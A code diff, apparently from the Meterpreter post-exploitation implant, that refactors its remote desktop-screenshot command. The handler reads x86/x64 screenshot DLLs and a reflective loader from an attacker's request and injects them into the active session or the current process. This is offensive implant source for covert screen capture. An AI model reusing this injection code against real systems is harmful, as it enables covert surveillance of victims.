@@ -403,7 +403,7 @@ DWORD request_ui_desktop_screenshot(Remote * remote, Packet * request)
 	Packet * response = NULL;
 	THREAD * pPipeThread = NULL;
 	LPVOID lpDllBuffer = NULL;
-	DLL_BUFFER DllBuffer = { 0 };
+	DLL_BUFFER dllBuffer = { 0 };
 	char cNamedPipe[MAX_PATH] = { 0 };
 	char cCommandLine[MAX_PATH] = { 0 };
 	int quality = 0;
@@ -426,16 +426,15 @@ DWORD request_ui_desktop_screenshot(Remote * remote, Packet * request)
 			quality = 50;
 		}
 
+		LPCSTR reflectiveLoader = met_api->packet.get_tlv_value_reflective_loader(request);
+
 		// get the x86 and x64 screenshot dll's. we are not obliged to send both but we reduce the number of processes
 		// we can inject into (wow64 and x64) if we only send one type on an x64 system. If we are on an x86 system
 		// we dont need to send the x64 screenshot dll as there will be no x64 processes to inject it into.
-		DllBuffer.dwPE32DllLenght = met_api->packet.get_tlv_value_uint(request, TLV_TYPE_DESKTOP_SCREENSHOT_PE32DLL_LENGTH);
-		DllBuffer.lpPE32DllBuffer = met_api->packet.get_tlv_value_string(request, TLV_TYPE_DESKTOP_SCREENSHOT_PE32DLL_BUFFER);
+		dllBuffer.lpPE32DllBuffer = met_api->packet.get_tlv_value_raw(request, TLV_TYPE_DESKTOP_SCREENSHOT_PE32DLL_BUFFER, &dllBuffer.dwPE32DllLength);
+		dllBuffer.lpPE64DllBuffer = met_api->packet.get_tlv_value_raw(request, TLV_TYPE_DESKTOP_SCREENSHOT_PE64DLL_BUFFER, &dllBuffer.dwPE64DllLength);
 
-		DllBuffer.dwPE64DllLenght = met_api->packet.get_tlv_value_uint(request, TLV_TYPE_DESKTOP_SCREENSHOT_PE64DLL_LENGTH);
-		DllBuffer.lpPE64DllBuffer = met_api->packet.get_tlv_value_string(request, TLV_TYPE_DESKTOP_SCREENSHOT_PE64DLL_BUFFER);
-
-		if (!DllBuffer.lpPE32DllBuffer && !DllBuffer.lpPE64DllBuffer)
+		if (!dllBuffer.lpPE32DllBuffer && !dllBuffer.lpPE64DllBuffer)
 		{
 			BREAK_WITH_ERROR("[UI] desktop_screenshot. Invalid dll arguments, at least 1 dll must be supplied", ERROR_BAD_ARGUMENTS);
 		}
@@ -474,7 +473,7 @@ DWORD request_ui_desktop_screenshot(Remote * remote, Packet * request)
 		if (dwCurrentSessionId != dwActiveSessionId)
 		{
 			dprintf("[UI] desktop_screenshot. Injecting into active session %d...\n", dwActiveSessionId);
-			if (session_inject(dwActiveSessionId, &DllBuffer, cCommandLine) != ERROR_SUCCESS)
+			if (session_inject(dwActiveSessionId, &dllBuffer, reflectiveLoader, cCommandLine) != ERROR_SUCCESS)
 			{
 				BREAK_WITH_ERROR("[UI] desktop_screenshot. session_inject failed", ERROR_ACCESS_DENIED);
 			}
@@ -482,7 +481,7 @@ DWORD request_ui_desktop_screenshot(Remote * remote, Packet * request)
 		else
 		{
 			dprintf("[UI] desktop_screenshot. Allready in the active session %d.\n", dwActiveSessionId);
-			if (ps_inject(GetCurrentProcessId(), &DllBuffer, cCommandLine) != ERROR_SUCCESS)
+			if (ps_inject(GetCurrentProcessId(), &dllBuffer, reflectiveLoader, cCommandLine) != ERROR_SUCCESS)
 			{
 				BREAK_WITH_ERROR("[UI] desktop_screenshot. ps_inject current process failed", ERROR_ACCESS_DENIED);
 			}
